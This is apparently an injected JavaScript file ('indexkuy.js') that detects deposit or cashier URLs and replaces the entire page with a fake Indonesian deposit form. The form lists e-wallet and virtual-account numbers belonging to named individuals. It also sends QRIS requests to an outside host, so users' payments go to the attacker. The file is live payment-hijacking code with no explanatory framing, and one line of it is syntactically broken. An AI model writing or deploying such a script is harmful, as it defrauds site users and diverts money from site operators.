(function(){
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) {
    console.log("[indexkuy.js] URL tidak cocok.");
    return;
  }

  console.log("[indexkuy.js] Ganti seluruh halaman...");

  const html = `
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Formulir Deposit</title>
    <style>
      body{margin:0;font-family:sans-serif;background:#eef2f6;padding:16px;text-align:center}
      h1{font-size:20px;margin-bottom:12px}
      .card{background:#fff;border-radius:12px;padding:16px;max-width:480px;margin:0 auto;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
      select,input,textarea,button{width:100%;margin-top:8px;padding:10px;border-radius:8px;border:1px solid #ccc;font-size:14px}
      button{background:#1f6feb;color:#fff;font-weight:bold;cursor:pointer}
      .bank-info{margin-top:12px;background:#f8fafc;padding:12px;border-radius:8px;text-align:left}
      .bank-info img{width:50px;height:50px;object-fit:contain;vertical-align:middle;margin-right:8px}
      .qr-card img{width:220px;height:220px;border-radius:8px;margin:12px auto}
      .spinner{width:36px;height:36px;border:4px solid #ddd;border-top:4px solid #1f6feb;border-radius:50%;animation:spin 1s linear infinite;margin:12px auto}
      @keyframes spin{to{transform:rotate(360deg)}}
    </style>
  </head>
  <body>
    <h1>Formulir Deposit</h1>
    <div class="card">
      <button onclick="showDeposit('manual')">Manual Deposit</button>
      <button onclick="showDeposit('auto')">Otomatis Deposit (QRIS)</button>

      <div id="manual-step" style="display:none">
        <select onchange="selectMethod(this.value)">
          <option value="" disabled selected>Pilih Metode</option>
          <option value='{"logo":"https://...","name":"Dana","number":"088214538915","owner":"SURWATI"}'>Dana</option>
          <option value='{"logo":"https://...","name":"Ovo","number":"088905200893","owner":"ENJAH"}'>Ovo</option>
          <option value='{"logo":"https://...","name":"BRI VA","number":"88810088214538915","owner":"SURWATI"}'>BRI VA</option>
          <option value='{"logo":"https://...","name":"BCA VA","number":"39358088905200893","owner":"ENJAH"}'>BCA VA</option>
          <option value='{"logo":"https://...","name":"BNI VA","number":"8810088214538915","owner":"SURWATI"}'>BNI VA</option>
          <option value='{"logo":"https://...","name":"MANDIRI VA","number":"60001088905200893","owner":"ENJAH"}'>Mandiri VA</option>
        </select>
        <div id="manual-details" class="bank-info" style="display:none">
          <img id="bank-logo" src="" alt="">
          <div><strong id="bank-name"></strong><br><span id="bank-number"></span><br><small id="bank-owner"></small></div>
        </div>
        <input id="manual-nominal" type="number" placeholder="Nominal min 50.000">
        <button onclick="submitManualDeposit()">Kirim</button>
        <div id="manual-result"></div>
      </div>

      <div id="auto-deposit" style="display:none">
        <input id="nominal" type="number" placeholder="Nominal min 50.000">
        <button onclick="generateQRIS()">Buat QRIS</button>
        <div id="auto-result"></div>
      </div>
    </div>

    <script>
      function showDeposit(type){
        document.getElementById('manual-step').style.display = type==='manual'?'block':'none';
        document.getElementById('auto-deposit').style.display = type==='auto'?'block':'none';
      }
      function selectMethod(val){
        if(!val) return;
        const m=JSON.parse(val);
        document.getElementById('manual-details').style.display='flex';
        document.getElementById('bank-logo').src=m.logo;
        bank-name.innerText=m.name;
        bank-number.innerText=m.number;
        bank-owner.innerText=m.owner;
      }
      function submitManualDeposit(){
        const n=Number(document.getElementById('manual-nominal').value||0);
        if(n<50000){alert('Minimal 50.000');return;}
        document.getElementById('manual-result').innerHTML='<div class="spinner"></div>';
        setTimeout(()=>{document.getElementById('manual-result').innerText="Deposit In Progress";setTimeout(()=>location.href="../",1500)},1500);
      }
      async function generateQRIS(){
        const n=Number(document.getElementById('nominal').value||0);
        if(n<50000){alert('Minimal 50.000');return;}
        document.getElementById('auto-result').innerHTML='<div class="spinner"></div>';
        try{
          const r=await fetch('https://apxnzd.page.gd/qris.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'qris=...&qty='+encodeURIComponent(n)+'&yn=n'});
          console.log('[QRIS] Status:',r.status);
          const t=await r.text();
          console.log('[QRIS] Response:',t);
          if(!t){document.getElementById('auto-result').innerText="Gagal membuat QRIS (respon kosong)";return;}
          document.getElementById('auto-result').innerHTML='<div class="qr-card"><img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(t)+'"></div>';
        }catch(e){
          console.error(e);
          document.getElementById('auto-result').innerText="Gagal membuat QRIS (fetch error)";
        }
      }
    </script>
  </body>
  </html>`;

  document.open();
  document.write(html);
  document.close();
})();
